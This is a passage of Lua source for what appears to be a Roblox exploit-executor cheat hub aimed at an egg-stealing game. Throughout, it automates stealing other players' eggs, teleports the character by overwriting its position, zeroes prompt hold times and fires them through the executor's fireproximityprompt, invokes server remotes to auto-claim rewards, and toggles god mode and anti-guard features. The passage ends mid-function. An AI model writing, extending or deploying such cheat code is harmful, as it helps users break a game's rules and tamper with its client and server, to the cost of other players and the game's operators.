				local ownedCategories = getOwnedEggCategories()
				local needsUpdated = false

				for k in pairs(riftNeeds) do
					if ownedCategories[k] then
						riftNeeds[k] = nil
						needsUpdated = true
					end
				end

				if needsUpdated then
					taskScheduler.Wake()
				end
			end

			local saveModule2 = gameModules.Save

			if type(saveModule2) == "table" and type(saveModule2.FieldSignal) == "function" then
				for _, fieldName in ipairs({ "EggInventory", "Inventory" }) do
					local ok, result = pcall(saveModule2.FieldSignal, fieldName)

					if ok and type(result) == "table" and type(result.Connect) == "function" then
						local ok2, connection = pcall(result.Connect, result, function()
							task.defer(updateRiftNeedsFromInventory)
						end)

						if ok2 and connection then
							trackCleanup(function()
								pcall(function()
									connection:Disconnect()
								end)
							end)
						end
					end
				end
			end

			riftPriorityToggle = autoStealSection:CreateToggle({
				Name = "Steal Missing Lab Eggs",
				Default = false,
				Callback = function()
					chilliState.Steal.RiftPriority = chilliState.Toggle(riftPriorityToggle, false) == true
					nextRiftRefreshTime = 0

					if not chilliState.Steal.RiftPriority then
						chilliState.Steal.RiftNeeds = {}
					end

					taskScheduler.Wake()
				end,
			})
		end

		do
			local indexRefreshRate = 5
			local claimRefreshRate = 5
			local claimCooldownDuration = 60
			local indexPriorityToggle = nil
			local nextIndexRefreshTime = 0
			local nextClaimTime = 0
			local isClaimingActive = false
			local lastClaimTimes = {}

			local function getSaveData()
				local saveModule = gameModules.Save

				if type(saveModule) == "table" and type(saveModule.Get) == "function" then
					local ok, result = pcall(saveModule.Get)
					if ok and type(result) == "table" then
						return result
					end
				end

				return nil
			end

			local function fetchMissingIndexEggs()
				local saveData = getSaveData()
				local areaDirectory = gameModules.Areas and gameModules.Areas.Directory
				local assetDirectory = gameModules.Assets and gameModules.Assets.Directory
				if not saveData or type(areaDirectory) ~= "table" or type(assetDirectory) ~= "table" then
					return
				end
				local indexData = type(saveData.Index) == "table" and saveData.Index or {}
				local ownedCategories = {}
				local pairsFunc = pairs
				local inventory = saveData.Inventory or {}

				for _, item in pairsFunc(inventory) do
					if type(item) == "table" and item.Category ~= nil then
						ownedCategories[tostring(item.Category)] = true
					end
				end

				local pairsFunc2 = pairs
				local eggInventory = saveData.EggInventory or {}

				for _, eggItem in pairsFunc2(eggInventory) do
					if type(eggItem) == "table" and eggItem.AssetCategory ~= nil then
						ownedCategories[tostring(eggItem.AssetCategory)] = true
					end
				end

				local missingEggsMap = {}

				for _, areaData in pairs(areaDirectory) do
					local areaRarity = type(areaData) == "table" and type(areaData.Rarity) == "table"

					if areaRarity then
						areaRarity = tonumber(areaData.Rarity.RarityNumber or areaData.Rarity.Rank)
					end

					areaRarity = areaRarity or 0
					local pairsFunc3 = pairs
					local dropTable = type(areaData) == "table" and areaData.DropTable or {}

					for _, dropEntry in pairsFunc3(dropTable) do
						local eggAssetId = type(dropEntry) == "table" and dropEntry[1] or nil
						local dropChance = type(dropEntry) == "table" and tonumber(dropEntry[2]) or 0
						local eggAssetData = eggAssetId ~= nil and assetDirectory[eggAssetId] or nil

						if type(eggAssetData) == "table" and dropChance > 0 and eggAssetData.DontRoll ~= true then
							local assetIdStr = tostring(eggAssetId)

							if indexData[eggAssetId] ~= true and not ownedCategories[assetIdStr] and (missingEggsMap[assetIdStr] == nil or areaRarity > missingEggsMap[assetIdStr]) then
								missingEggsMap[assetIdStr] = areaRarity
							end
						end
					end
				end

				missingIndexList = missingEggsMap
			end

			local function invokeRemoteFunc(remoteName, ...)
				local remote = networking:FindFirstChild(remoteName)
				if not remote or not remote:IsA("RemoteFunction") then
					return false
				end
				local ok, result = pcall(remote.InvokeServer, remote, ...)
				return ok and result ~= false
			end

			local function extractAssetIdsFromLists(moduleConfig, targetLists)
				local extractedIds = {}
				if type(moduleConfig) ~= "table" then
					return extractedIds
				end

				for _, targetList in ipairs(targetLists) do
					local listRef = moduleConfig

					for _, key in ipairs(targetList) do
						listRef = type(listRef) == "table" and listRef[key] or nil
					end

					local ipairsFunc = ipairs
					local resolvedList = type(listRef) == "table" and listRef or {}

					for _, entry in ipairsFunc(resolvedList) do
						if type(entry) == "table" and entry.AssetId ~= nil then
							table.insert(extractedIds, entry.AssetId)
						end
					end
				end

				return extractedIds
			end

			local indexEggConfigs = {
				{
					Id = "LimitedEgg",
					Gear = "GravityDisruptor",
					Module = "LimitedEgg",
					Lists = { { "Entries" }, { "MechaReroll", "Entries" } },
				},
				{
					Id = "BrainrotEgg",
					Gear = "BeeLauncher",
					Module = "BrainrotEgg",
					Lists = { { "Entries" } },
				},
				{
					Id = "MonsterEgg",
					Gear = "BeeLauncher",
					Module = "MonsterEgg",
					Lists = { { "Entries" }, { "MechaEntries" } },
				},
			}

			local function processIndexClaims()
				local saveData = getSaveData()
				if not saveData then
					return
				end
				local indexData = type(saveData.Index) == "table" and saveData.Index or {}
				local indexClaimedCategories = type(saveData.IndexClaimedCategories) == "table" and saveData.IndexClaimedCategories or {}

				for k, isUnlocked in pairs(indexData) do
					if isUnlocked == true and indexClaimedCategories[k] ~= true then
						invokeRemoteFunc("RF/Codex/AskRedeemAll")
						break
					end
				end

				local gearInventory = type(saveData.GearInventory) == "table" and saveData.GearInventory or {}

				for _, config in ipairs(indexEggConfigs) do
					local canClaim = (tonumber(gearInventory[config.Gear]) or 0) <= 0

					if canClaim then
						canClaim = os.clock() >= (lastClaimTimes[config.Id] or 0)
					end

					if canClaim then
						local assetIds = extractAssetIdsFromLists(gameModules[config.Module], config.Lists)
						local allCollected = #assetIds > 0

						for _, assetId in ipairs(assetIds) do
							if indexData[assetId] ~= true then
								allCollected = false
								break
							end
						end

						if allCollected then
							lastClaimTimes[config.Id] = os.clock() + claimCooldownDuration
							invokeRemoteFunc("RF/Codex/AskRedeemLimitedEgg", config.Id)
						end
					end
				end
			end

			taskScheduler.Add(function()
				local now = os.clock()

				if isIndexPriorityActive and now >= nextIndexRefreshTime then
					nextIndexRefreshTime = now + indexRefreshRate
					pcall(fetchMissingIndexEggs)
				end

				if not isClaimingActive and now >= nextClaimTime and chilliState.Toggle(chilliState.IndexClaimHandle, false) then
					isClaimingActive = true
					nextClaimTime = now + claimRefreshRate

					task.spawn(function()
						pcall(processIndexClaims)
						isClaimingActive = false
					end)
				end

				return false
			end)

			indexPriorityToggle = autoStealSection:CreateToggle({
				Name = "Steal Missing Index Eggs",
				Note = "Also steal eggs missing from your index, highest area first",
				Default = false,
				Callback = function()
					isIndexPriorityActive = chilliState.Toggle(indexPriorityToggle, false) == true
					nextIndexRefreshTime = 0

					if not isIndexPriorityActive then
						missingIndexList = {}
					end

					taskScheduler.Wake()
				end,
			})

			chilliState.IndexClaimRestart = function()
				nextClaimTime = 0
				taskScheduler.Wake()
			end
		end

		chilliState.Steal.PriorityHandle = autoStealSection:CreateDropdown({
			Name = "Steal Priority",
			Options = sortPriorityOptions,
			Default = sortPriorityOptions[4],
			Callback = function(arg)
				if table.find(sortPriorityOptions, arg) then
					selectedSortPriority = arg

					if type(chilliState.ResortSteal) == "function" then
						chilliState.ResortSteal()
					end
				end
			end,
		})

		chilliState.SafeCarry.InstantHandle = autoStealSection:CreateToggle({
			Name = "Instant Steal",
			Note = "Delivers the egg to the safe zone in a few seconds, needs enough Speed",
			Default = false,
			Callback = function(arg)
				if type(arg) ~= "boolean" then
					arg = chilliState.Toggle(chilliState.SafeCarry.InstantHandle, false)
				end

				chilliState.SafeCarry.LineDrop = arg ~= false
				chilliState.SafeCarry.SpeedJitter = chilliState.SafeCarry.LineDrop and 0 or 0.08

				if chilliState.StealPanelSync then
					pcall(chilliState.StealPanelSync)
				end
			end,
		})

		chilliState.SafeCarry.RunHandle = autoStealSection:CreateSlider({
			Name = "Tween Speed",
			Note = "Over 100% may glitch",
			Min = 50,
			Max = 120,
			Default = 100,
			Increment = 1,
			Unit = "%",
			Callback = function(arg)
				chilliState.SafeCarry.RunSpeed = math.clamp(tonumber(arg) or 100, 50, 120) / 100
			end,
		})

		autoStealSection:CreateSlider({
			Name = "Carry Speed",
			Min = 80,
			Max = 120,
			Default = 100,
			Increment = 1,
			Unit = "%",
			Callback = function(arg)
				chilliState.SafeCarry.CarryScale = math.clamp(tonumber(arg) or 100, 80, 120) / 100
			end,
		})

		chilliState.AntiGuard.Handle = hubWindow:CreateState({ Name = "Anti Guard Enabled", Default = false })

		pcall(function()
			chilliState.AntiGuard.Enabled = chilliState.AntiGuard.Handle:Get() == true
		end)

		pcall(function()
			chilliState.AntiGuard.Handle:Subscribe(function(arg)
				if type(arg) ~= "boolean" then
					arg = chilliState.AntiGuard.Handle:Get()
				end

				chilliState.AntiGuard.Enabled = arg == true

				if chilliState.StealPanelSync then
					pcall(chilliState.StealPanelSync)
				end

				if chilliState.AntiGuard.Render and chilliState.UiDefer then
					chilliState.UiDefer(function()
						pcall(chilliState.AntiGuard.Render, false)
					end)
				end
			end)
		end)

		chilliState.AntiGuard.PanelHandle = autoStealSection:CreateToggle({
			Name = "Anti Guard Panel",
			Default = true,
			Callback = function(panelShown)
				if type(panelShown) ~= "boolean" then
					panelShown = chilliState.Toggle(chilliState.AntiGuard.PanelHandle, true)
				end

				chilliState.AntiGuard.PanelShown = panelShown

				if chilliState.AntiGuard.ShowPanel then
					pcall(chilliState.AntiGuard.ShowPanel, panelShown)
				end
			end,
		})

		local mainToggle
		mainToggle = nil
		local activeAction
		activeAction = nil
		local activeTarget
		activeTarget = nil
		local targetName
		targetName = "None"
		local actionStatus
		actionStatus = "Idle"
		local isStealing
		isStealing = false
		local stealSessionId
		stealSessionId = 0
		local targetList
		targetList = {}
		local stealCooldown
		stealCooldown = 20
		local targetUid
		targetUid = nil
		local shouldCancelSteal

		shouldCancelSteal = function(sessionId)
			return sessionId ~= stealSessionId or not chilliState.Toggle(mainToggle, false)
		end

		local getNightOrWallWaitTime

		do
			local scheduledWakes = {}

			local function scheduleWake(targetTime)
				if type(targetTime) ~= "number" or scheduledWakes[targetTime] then
					return
				end
				scheduledWakes[targetTime] = true

				task.delay(math.max(0, targetTime - workspace:GetServerTimeNow()) + 0.05, function()
					scheduledWakes[targetTime] = nil
					taskScheduler.Wake()
				end)
			end

			local lastWallWaitTime = 0

			getNightOrWallWaitTime = function()
				local areaEggCycle = gameModules.AreaEggCycle
				if type(areaEggCycle) ~= "table" then
					return nil
				end

				local ok, serverTimeNow, isNight, nextNightTime, nextResetTime = pcall(function()
					local now = workspace:GetServerTimeNow()
					local resetTimeFunc = areaEggCycle.NextResetTime
					return now, areaEggCycle.IsNightPhase(now), areaEggCycle.NextNightTime(now), resetTimeFunc(now)
				end)

				if not ok or type(nextResetTime) ~= "number" then
					return nil
				end

				if isNight == true then
					lastWallWaitTime = nextResetTime + chilliState.WallOpenDelay()
					scheduleWake(lastWallWaitTime)
					return lastWallWaitTime, "night", serverTimeNow
				end

				if chilliState.WallSealed() then
					scheduleWake(serverTimeNow + 0.3)
					return math.max(lastWallWaitTime, serverTimeNow), "wall", serverTimeNow
				end

				if type(nextNightTime) == "number" and nextNightTime > serverTimeNow then
					scheduleWake(nextNightTime)
				end

				return nil
			end
		end

		do
			local areaEggResetWall = gameModules.AreaEggResetWall
			local changedSignal = type(areaEggResetWall) == "table" and areaEggResetWall.Changed or nil

			if changedSignal and type(changedSignal.Connect) == "function" then
				local ok, connection = pcall(function()
					return changedSignal:Connect(function()
						taskScheduler.Wake()
					end)
				end)

				if ok and connection then
					trackCleanup(function()
						pcall(function()
							connection:Disconnect()
						end)
					end)
				end
			end
		end

		local stealRadius
		stealRadius = 8
		local currentTargetData
		currentTargetData = nil
		local lastSearchTime
		lastSearchTime = 0
		local checkNightPhaseStart, forceEggSearch, checkTargetValidity
		local fn15, fn16, fn17
		local isNightCheck

		local function searchForEggs(excludeOwnEggs)
			local foundEggs = {}
			local userIdStr = "FirstAreaEgg_" .. tostring(localPlayer.UserId)
			local records = fetchFieldEggs()

			if type(records) == "table" then
				for _, record in pairs(records) do
					local isValidEgg = type(record) == "table" and type(record.Uid) == "string"

					if isValidEgg then
						isValidEgg = not (excludeOwnEggs and string.sub(record.Uid, 1, #userIdStr) == userIdStr)
					end

					if isValidEgg then
						foundEggs[record.Uid] = true
					end
				end
			end

			return foundEggs
		end

		checkNightPhaseStart = function()
			if currentTargetData == nil then
				return false
			end

			if chilliState.IsNight() then
				return true
			end

			if lastSearchTime == math.huge then
				lastSearchTime = os.clock() + stealRadius
			end

			return false
		end

		forceEggSearch = function()
			if currentTargetData and lastSearchTime == math.huge then
				return
			end
			currentTargetData = searchForEggs(true)
			lastSearchTime = math.huge
			table.clear(targetSpecificEggs)
			table.clear(blockedEggsList)
			table.clear(ignoredSpecificEggs)
			table.clear(targetList)
			targetUid = nil
		end

		checkTargetValidity = function()
			if not currentTargetData then
				return false
			end

			if os.clock() >= lastSearchTime then
				currentTargetData = nil
				return false
			end
			local currentEggs = searchForEggs()
			if next(currentEggs) == nil then
				return true
			end
			local targetStillExists = false
			local newEggsAppeared = false

			for k in pairs(currentEggs) do
				if currentTargetData[k] then
					targetStillExists = true
				else
					newEggsAppeared = true
				end
			end

			if not targetStillExists then
				currentTargetData = nil
				return false
			end
			return not newEggsAppeared
		end

		fn15 = checkNightPhaseStart
		fn16 = forceEggSearch
		fn17 = checkTargetValidity
		isNightCheck = checkNightPhaseStart

		local getSortedEggTargets

		do
			local function getAssetRarityInfo(assetCategory)
				local directory = gameModules.Assets and gameModules.Assets.Directory
				local assetData = type(directory) == "table" and directory[tostring(assetCategory)] or nil
				local rarity = type(assetData) == "table" and type(assetData.Rarity) == "table" and assetData.Rarity or nil
				local assetInfo = {}

				if rarity then
					rarity = tonumber(rarity.RarityNumber or rarity.Rank)
				end

				assetInfo.RarityNumber = rarity or 0
				assetInfo.EarningRate = type(assetData) == "table" and tonumber(assetData.EarningRate) or 0
				return assetInfo
			end

			local function getMutationMultiplier(mutationsData)
				local mutationsModule = gameModules.Mutations

				if type(mutationsModule) == "table" and type(mutationsModule.EarningsFor) == "function" then
					local ok, result = pcall(mutationsModule.EarningsFor, type(mutationsData) == "table" and mutationsData or {})
					if ok and type(result) == "number" then
						return result
					end
				end

				return 1
			end

			local function getEggWeight(scaleArg, weightArg)
				local eggRecords = gameModules.EggRecords

				if type(eggRecords) == "table" and type(eggRecords.WeightKgForScale) == "function" then
					local ok, result = pcall(eggRecords.WeightKgForScale, scaleArg, weightArg)
					if ok and type(result) == "number" then
						return result
					end
				end

				return 0
			end

			getSortedEggTargets = function(isForced, isNight)
				getWantedEggs = getSortedEggTargets
				local records = fetchFieldEggs()

				if type(records) ~= "table" then
					return {}
				end
				local validTargets = {}
				local claimedEggs = {}

				for _, record in pairs(records) do
					local eggUid = type(record) == "table" and record.Uid or nil

					if eggUid and record.State ~= "Claimed" then
						claimedEggs[eggUid] = true
					end

					local isOthersCarrying = record.State == "Carried" and isNight == true and isForced ~= true and not (chilliState.Steal.Carrying and eggUid == chilliState.Steal.CarryUid)
					local isAvailable

					if eggUid then
						isAvailable = record.State == "Slot" or record.State == "Dropped" or isOthersCarrying
					else
						isAvailable = eggUid
					end

					local isSpecificTarget = eggUid and targetSpecificEggs[eggUid] or nil
					local isIgnored = eggUid and ignoredSpecificEggs[eggUid] == true or false
					local isIndexNeed = isForced ~= true and isIndexPriorityActive and eggUid and missingIndexList[tostring(record.AssetCategory)] or nil
					local isRiftNeed = isForced ~= true and chilliState.Steal.RiftPriority == true and eggUid ~= nil and chilliState.Steal.RiftNeeds[tostring(record.AssetCategory)] == true
					local isAreaMatch = (next(activeTargetAreas) == nil) or (record.AreaId and (activeTargetAreas[tostring(record.AreaId)] == true or activeTargetAreas[string.lower(tostring(record.AreaId))] == true))
					local isTargetAreaOrNeed = isForced == true or isSpecificTarget ~= nil or isIgnored or isRiftNeed or isIndexNeed ~= nil or isAreaMatch
					local isBlocked = isForced ~= true and isSpecificTarget == nil and blockedEggsList[eggUid] == true
					local isInSearchRadius = currentTargetData ~= nil and currentTargetData[eggUid] == true
					isAvailable = isAvailable and typeof(record.BottomCFrame) == "CFrame"
					local isCooldownOver

					if isAvailable then
						isCooldownOver = (targetList[eggUid] or 0) <= os.clock()
					else
						isCooldownOver = isAvailable
					end

					if isCooldownOver and isTargetAreaOrNeed and not isBlocked and not isInSearchRadius then
						local assetInfo = getAssetRarityInfo(record.AssetCategory)
						local assetCategoryStr = tostring(record.AssetCategory)
						local meetsMinRarity = assetInfo.RarityNumber >= minRarityValue
						local meetsMutationFilter = next(targetMutations) == nil or targetMutations[assetCategoryStr] == true
						local eggScale = tonumber(record.AssetScale) or 1
						local mutationMultiplier = getMutationMultiplier(record.Mutations)
						local baseValue = eggScale > 5 and (eggScale / 5) ^ 1.2 * 19.637875755794113 or eggScale ^ 1.85
						local meetsMinValue = minStealValue <= 0 or assetInfo.EarningRate * baseValue * mutationMultiplier >= minStealValue
						meetsMinValue = meetsMinRarity and meetsMutationFilter and meetsMinValue
						local isRiftOverride = isRiftNeed and not meetsMinValue and not isIgnored and isSpecificTarget == nil and isIndexNeed == nil
						local lastSkip = isForced ~= true and chilliState.SafeCarry.Unsafe({ Uid = eggUid, Category = assetCategoryStr })

						if lastSkip then
							targetSpecificEggs[eggUid] = nil
							ignoredSpecificEggs[eggUid] = nil
							chilliState.SafeCarry.LastSkip = lastSkip
						elseif isForced == true or isSpecificTarget or isIgnored or isRiftNeed or isIndexNeed ~= nil or meetsMinValue then
							table.insert(validTargets, {
								Uid = eggUid,
								Category = assetCategoryStr,
								Scale = eggScale,
								State = record.State,
								Rarity = assetInfo.RarityNumber,
								Weight = getEggWeight(record.AssetCategory, eggScale),
								Mutation = mutationMultiplier,
								Value = assetInfo.EarningRate * baseValue * mutationMultiplier,
								CFrame = record.BottomCFrame,
								AreaId = tostring(record.AreaId),
								Rift = isForced ~= true and isRiftNeed,
								RiftOnly = isForced ~= true and isRiftOverride,
								Index = isIndexNeed,
								Forced = isForced ~= true and isSpecificTarget and isSpecificTarget.At or nil,
								Priority = isForced ~= true and isIgnored,
							})
						end
					end
				end

				if next(claimedEggs) ~= nil then
					for k in pairs(targetSpecificEggs) do
						if not claimedEggs[k] then
							targetSpecificEggs[k] = nil
						end
					end

					for k in pairs(ignoredSpecificEggs) do
						if not claimedEggs[k] then
							ignoredSpecificEggs[k] = nil
						end
					end

					for k in pairs(blockedEggsList) do
						if not claimedEggs[k] then
							blockedEggsList[k] = nil
						end
					end
				end

				table.sort(validTargets, function(a, b)
					if (a.Forced ~= nil) ~= (b.Forced ~= nil) then
						return a.Forced ~= nil
					end

					if a.Forced and b.Forced and a.Forced ~= b.Forced then
						return a.Forced < b.Forced
					end

					if a.Priority ~= b.Priority then
						return a.Priority == true
					end

					if a.RiftOnly ~= b.RiftOnly then
						return b.RiftOnly == true
					end

					if (a.Index ~= nil) ~= (b.Index ~= nil) then
						return a.Index ~= nil
					end

					if a.Index and b.Index and a.Index ~= b.Index then
						return a.Index > b.Index
					end

					if selectedSortPriority == sortPriorityOptions[2] and a.Weight ~= b.Weight then
						return a.Weight > b.Weight
					end

					if selectedSortPriority == sortPriorityOptions[3] and a.Mutation ~= b.Mutation then
						return a.Mutation > b.Mutation
					end

					if selectedSortPriority == sortPriorityOptions[4] and a.Value ~= b.Value then
						return a.Value > b.Value
					end

					if selectedSortPriority == sortPriorityOptions[5] and a.Value ~= b.Value then
						return a.Value < b.Value
					end

					if a.Rarity ~= b.Rarity then
						return a.Rarity > b.Rarity
					end

					if a.Value ~= b.Value then
						return a.Value > b.Value
					end
					return tostring(a.Uid) < tostring(b.Uid)
				end)

				return validTargets
			end
		end

		local flightSpeed
		flightSpeed = 6
		local calculateFlightVelocity, stopFlightVelocity, cleanupFlight, isRagdolled, startFlightToTarget

		do
			local flightTarget = nil
			local flightConnection = nil

			calculateFlightVelocity = function(rootPart, targetPos, speed, deltaTime, stateInfo)
				local distanceVector = targetPos - rootPart.Position
				local distance = distanceVector.Magnitude
				local clampedDelta = math.max(deltaTime, 0.0041666666666666666)
				local velocityVector = Vector3.zero

				if distance > 0.01 then
					velocityVector = distanceVector.Unit * math.min(speed, distance / clampedDelta)
				end

				local newVelocity = velocityVector + Vector3.new(0, workspace.Gravity * clampedDelta * 0.5, 0)

				if distance > 2 then
					if not stateInfo.mark then
						stateInfo.mark = distance
						stateInfo.clock = 0
					end

					stateInfo.clock = stateInfo.clock + deltaTime

					if stateInfo.clock >= 0.4 then
						if stateInfo.mark - distance < speed * 0.1 then
							pcall(function()
								rootPart.CFrame = rootPart.CFrame + distanceVector.Unit * math.min(distance, speed * clampedDelta)
							end)
						end

						stateInfo.mark = distance
						stateInfo.clock = 0
					end
				else
					stateInfo.mark = nil
				end

				pcall(function()
					rootPart.AssemblyLinearVelocity = newVelocity
					rootPart.AssemblyAngularVelocity = Vector3.zero
				end)

				return distance <= 0.5
			end

			stopFlightVelocity = function()
				local rootPart = chilliState.Root()

				if rootPart then
					pcall(function()
						rootPart.AssemblyLinearVelocity = Vector3.zero
						rootPart.AssemblyAngularVelocity = Vector3.zero
					end)
				end
			end

			local flightStuckConnection = nil
			local flightStateInfo = {}

			cleanupFlight = function()
				flightTarget = nil

				if flightConnection then
					flightConnection:Disconnect()
					flightConnection = nil
				end

				if flightStuckConnection then
					flightStuckConnection:Disconnect()
					flightStuckConnection = nil
				end
			end

			isRagdolled = function()
				local ragdollEndTime = tonumber(localPlayer:GetAttribute("RagdollEndTime"))
				return ragdollEndTime ~= nil and ragdollEndTime > workspace:GetServerTimeNow()
			end

			local ignoreCollisions = false

			local function isCollisionIgnored()
				if ignoreCollisions then
					return true
				end
				return true
			end

			startFlightToTarget = function(targetVector, ignoreCollisionsArg)
				flightTarget = targetVector
				ignoreCollisions = ignoreCollisionsArg == true
				if flightConnection or not targetVector then
					return
				end
				flightStateInfo = {}

				flightConnection = RunService.Heartbeat:Connect(function()
					if not flightTarget or isCollisionIgnored() or isRagdolled() or chilliState.AntiGuard.Busy then
						return
					end
					local rootPart = chilliState.Root()
					if not rootPart then
						return
					end

					pcall(function()
						local rotation = rootPart.CFrame.Rotation
						rootPart.CFrame = CFrame.new(flightTarget) * rotation
						rootPart.AssemblyLinearVelocity = Vector3.zero
						rootPart.AssemblyAngularVelocity = Vector3.zero
					end)
				end)

				flightStuckConnection = RunService.PreSimulation:Connect(function(deltaTime)
					if not flightTarget or not isCollisionIgnored() or isRagdolled() or chilliState.AntiGuard.Busy then
						return
					end
					local rootPart = chilliState.Root()

					if rootPart then
						calculateFlightVelocity(rootPart, flightTarget, 400, deltaTime, flightStateInfo)
					end
				end)
			end
		end

		trackCleanup(cleanupFlight)
		local resetFlightState

		resetFlightState = function()
			cleanupFlight()
			chilliState.EndFlight()
			chilliState.GodMode(false)
			local character = localPlayer.Character
			character = character and character:FindFirstChildOfClass("Humanoid")

			if character then
				character.PlatformStand = false
			end
		end
		local cleanupSteal = resetFlightState

		local maxInteractDistance, checkEggIsClear, findClosestEggPrompt

		do
			local eggHitboxRadius = 1.5
			maxInteractDistance = 0.6

			local function getXZDistance(pos1, pos2)
				local x = pos2.X
				return (Vector3.new(pos1.X, 0, pos1.Z) - Vector3.new(x, 0, pos2.Z)).Magnitude
			end

			local function getSafePivotPosition(model)
				local ok, result = pcall(function()
					return model:GetPivot().Position
				end)

				return ok and result or nil
			end

			checkEggIsClear = function(eggPart, ignoreUid, rootPos)
				local distanceToRoot = getXZDistance(eggPart.Position, rootPos)
				local areaEggSlotsClient = workspace:FindFirstChild("AreaEggSlotsClient")

				if areaEggSlotsClient then
					for _, slotModel in ipairs(areaEggSlotsClient:GetChildren()) do
						if slotModel:IsA("Model") and slotModel.Name ~= ignoreUid then
							local slotPos = getSafePivotPosition(slotModel)
							if slotPos and getXZDistance(slotPos, eggPart.Position) + eggHitboxRadius < distanceToRoot then
								return false
							end
						end
					end
				end

				for _, child in ipairs(workspace:GetChildren()) do
					if child:IsA("Model") and child.Name ~= ignoreUid and #child.Name == 32 and child:FindFirstChild("Hitbox") then
						local childPos = getSafePivotPosition(child)
						if childPos and getXZDistance(childPos, eggPart.Position) + eggHitboxRadius < distanceToRoot then
							return false
						end
					end
				end

				return true
			end

			chilliState.Steal.WrongEgg = function(carryUid)
				local stealState = chilliState.Steal
				if type(carryUid) ~= "string" or not stealState.Carrying or stealState.CarryUid == carryUid then
					return false
				end
				local eggStateModule = gameModules.EggState

				if type(eggStateModule) == "table" and type(eggStateModule.DropFieldEgg) == "function" then
					pcall(eggStateModule.DropFieldEgg, "PlayerRequest")
				end

				local waitTime = 0

				while stealState.Carrying and waitTime < 1 do
					waitTime += RunService.Heartbeat:Wait()
				end

				stealState.Carrying = false
				stealState.CarryUid = carryUid
				return true
			end

			findClosestEggPrompt = function(eggUid, rootPos, maxRadius)
				local bestDist = maxRadius or 14
				local bestPrompt = nil
				local bestPart = nil

				for _, promptPart in ipairs(workspace:GetChildren()) do
					if promptPart.Name == "SmartPromptPart" and promptPart:IsA("BasePart") then
						local eggPrompt = promptPart:FindFirstChild("CarryAreaEgg")

						if eggPrompt and eggPrompt:IsA("ProximityPrompt") then
							local dist = getXZDistance(promptPart.Position, rootPos)

							if dist < bestDist then
								bestDist = dist
								bestPrompt = eggPrompt
								bestPart = promptPart
							end
						end
					end
				end

				if not bestPrompt or not bestPart then
					return nil
				end

				if type(eggUid) == "string" and not checkEggIsClear(bestPart, eggUid, rootPos) then
					return nil
				end
				return bestPrompt, bestPart
			end
		end

		local sendCarryEggRequest

		sendCarryEggRequest = function(eggUid)
			local eggStateModule = gameModules.EggState

			if type(eggUid) == "string" and type(eggStateModule) == "table" and type(eggStateModule.CarryFieldEgg) == "function" then
				pcall(eggStateModule.CarryFieldEgg, eggUid)
			end
		end

		local verifyEggHeld
		local processCarryEgg
		local autoStealRoutine
		local fn29

		do
			local function getCurrentCarryUid()
				local carryUid = chilliState.Steal.CarryUid
				return type(carryUid) == "string" and carryUid or nil
			end

			local function isStillCarryingEgg(eggUid)
				local currentUid = getCurrentCarryUid()
				if not currentUid or type(eggUid) ~= "string" then
					return true
				end
				return currentUid == eggUid
			end

			local function isTargetStillValid(eggUid)
				if type(eggUid) ~= "string" then
					return false
				end
				local sortedTargets = getSortedEggTargets(false, true)
				if #sortedTargets == 0 then
					return true
				end

				for _, targetData in ipairs(sortedTargets) do
					if targetData.Uid == eggUid then
						return true
					end
				end

				return false
			end

			local function dropCarriedEgg(sessionId)
				local eggStateModule = gameModules.EggState

				if type(eggStateModule) == "table" and type(eggStateModule.DropFieldEgg) == "function" then
					pcall(eggStateModule.DropFieldEgg, "PlayerRequest")
				end

				local waitTime = 0

				while chilliState.Steal.Carrying and waitTime < 1 and not shouldCancelSteal(sessionId) do
					waitTime += RunService.Heartbeat:Wait()
				end
			end

			verifyEggHeld = function(eggUid, sessionId)
				local waitTime = 0

				while not chilliState.Steal.Carrying and waitTime < maxInteractDistance and not shouldCancelSteal(sessionId) do
					waitTime += RunService.Heartbeat:Wait()
				end

				if not chilliState.Steal.Carrying then
					actionStatus = "The egg never reached the hand"
					return false
				end

				if isStillCarryingEgg(eggUid) then
					return true
				end
				local currentUid = getCurrentCarryUid()
				if isTargetStillValid(currentUid) then
					actionStatus = "Holding another egg that still matches, delivering it"
					return true
				end
				actionStatus = "Wrong egg in hand, dropping it"
				dropCarriedEgg(sessionId)
				return false
			end

			processCarryEgg = verifyEggHeld
			autoStealRoutine = verifyEggHeld
			fn29 = verifyEggHeld
		end

		local interactAndGrabEgg

		interactAndGrabEgg = function(targetData, sessionId)
			local eggStateModule = gameModules.EggState
			local targetPos = typeof(targetData.CFrame) == "CFrame" and targetData.CFrame.Position or nil
			if not targetPos then
				return false
			end
			local totalWaitTime = 0
			local promptWaitTime = math.huge
			local failCount = 0

			while totalWaitTime < 1.5 do
				if shouldCancelSteal(sessionId) then
					return false
				end

				if chilliState.Steal.Carrying and not chilliState.Steal.WrongEgg(targetData.Uid) then
					return true
				end

				if promptWaitTime >= 0.06 then
					local eggPrompt = findClosestEggPrompt(targetData.Uid, targetPos)

					if eggPrompt then
						pcall(function()
							eggPrompt.HoldDuration = 0
						end)

						failCount = 0

						if typeof(fireproximityprompt) == "function" then
							pcall(fireproximityprompt, eggPrompt)
						end
					else
						failCount += 1
						if failCount >= 4 then
							return false
						end

						if type(eggStateModule) == "table" and type(eggStateModule.CarryFieldEgg) == "function" then
							pcall(eggStateModule.CarryFieldEgg, targetData.Uid)
						end
					end

					promptWaitTime = 0
				end

				local deltaTime = RunService.Heartbeat:Wait()
				totalWaitTime += deltaTime
				promptWaitTime += deltaTime
			end

			return chilliState.Steal.Carrying == true
		end

		local isPlayerRagdolled

		local ragdollModule = safeRequire(function()
			return ReplicatedStorage.Shared.Modules.Ragdoll
		end)

		isPlayerRagdolled = function()
			local character = localPlayer.Character

			if type(ragdollModule) == "table" and type(ragdollModule.IsRagdolled) == "function" then
				local ok, result = pcall(ragdollModule.IsRagdolled, character)
				if ok and result == true then
					return true
				end
			end

			local ragdollEndTime = tonumber(localPlayer:GetAttribute("RagdollEndTime"))
			if ragdollEndTime and ragdollEndTime > workspace:GetServerTimeNow() then
				return true
			end
			character = character and character:FindFirstChildOfClass("Humanoid")
			if character then
				local state = character:GetState()
				return state == Enum.HumanoidStateType.Physics or state == Enum.HumanoidStateType.Ragdoll or state == Enum.HumanoidStateType.FallingDown
			end
			return false
		end

		local getClosestTarget, stealTargetMaxDist, stealBaseTweenSpeed, moveToTargetAndSteal, flyToPosition, stealHome, checkTargetObstacles, grabAndReturnToSafeZone

		do
			local function verifyEggAvailableFromServer(eggUid, sessionId)
				if chilliState.Steal.Carrying then
					return true
				end
				local rfEggWorldAskFieldEggSnapshot = networking:FindFirstChild("RF/EggWorld/AskFieldEggSnapshot")
